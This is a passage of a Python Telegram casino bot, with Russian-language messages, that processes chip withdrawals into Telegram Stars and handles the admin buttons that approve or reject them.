    bot.answer_callback_query(call.id)
    try:
        amount = int(call.data.split("_")[1])
        _process_withdraw(call.message.chat.id, call.from_user.id, call.from_user, amount)
    except Exception:
        traceback.print_exc()

def _process_withdraw(chat_id, user_id, user, amount):
    p = get_player(user_id)
    if not p:
        return
    if amount < MIN_WITHDRAW:
        bot.send_message(chat_id, f"Минимальная сумма вывода: {MIN_WITHDRAW} фишек!")
        return
    if amount > p[2]:
        bot.send_message(chat_id, f"Недостаточно фишек! Ваш баланс: {p[2]}")
        return

    # Списываем фишки
    update_balance(user_id, -amount)
    p_new = get_player(user_id)

    username = f"@{user.username}" if user.username else f"ID: {user_id}"

    # Уведомляем игрока
    bot.send_message(chat_id,
        f"✅ Заявка на вывод принята!\n💸 Сумма: {amount} фишек = {amount} ⭐\nОжидайте, администратор отправит Stars в ближайшее время.\n\n💰 Остаток на балансе: {p_new[2]} фишек")

    # Уведомляем всех админов через админ-бот
    admin_bot = telebot.TeleBot(os.environ.get("ADMIN_BOT_TOKEN"))
    admin_kb = InlineKeyboardMarkup()
    admin_kb.add(
        InlineKeyboardButton("✅ Выполнено", callback_data=f"wadmin_done_{user_id}_{amount}"),
        InlineKeyboardButton("❌ Отклонить", callback_data=f"wadmin_reject_{user_id}_{amount}"),
    )
    for admin_id in ADMIN_IDS:
        try:
            admin_bot.send_message(admin_id,
                f"💸 Новая заявка на вывод!\n\nИгрок: {p[1]} ({username})\nСумма: {amount} фишек = {amount} ⭐\nID: {user_id}\n\nОтправьте Stars игроку и нажмите Выполнено.",
                reply_markup=admin_kb)
        except Exception:
            traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("wadmin_done_"))
def cb_wadmin_done(call):
    bot.answer_callback_query(call.id)
    try:
        parts = call.data.split("_")
        user_id = int(parts[2])
        amount = int(parts[3])
        p = get_player(user_id)
        name = p[1] if p else str(user_id)
        bot.edit_message_text(
            f"✅ Выполнено! {name} получил {amount} ⭐",
            call.message.chat.id, call.message.message_id)
        try:
            bot.send_message(user_id,
                f"✅ Ваш вывод выполнен!\n💫 {amount} ⭐ Telegram Stars отправлены.")
        except Exception:
            pass
    except Exception:
        traceback.print_exc()

@bot.callback_query_handler(func=lambda c: c.data.startswith("wadmin_reject_"))
def cb_wadmin_reject(call):
    bot.answer_callback_query(call.id)
    try:
        parts = call.data.split("_")
        user_id = int(parts[2])
        amount = int(parts[3])
        # Возвращаем фишки
        update_balance(user_id, amount)
        p = get_player(user_id)
        name = p[1] if p else str(user_id)
        bot.edit_message_text(
            f"❌ Отклонено. {name} — {amount} фишек возвращены.",
            call.message.chat.id, call.message.message_id)
        try:
            bot.send_message(user_id,
                f"❌ Ваша заявка на вывод отклонена.\n💰 {amount} фишек возвращены на баланс.")
        except Exception:
            pass
    except Exception:
        traceback.print_exc()

# =================== ЗАПУСК ===================
if __name__ == "__main__":
    init_db()
    print("🎰 Бот запущен! Нажмите Ctrl+C для остановки.")
    bot.infinity_polling()

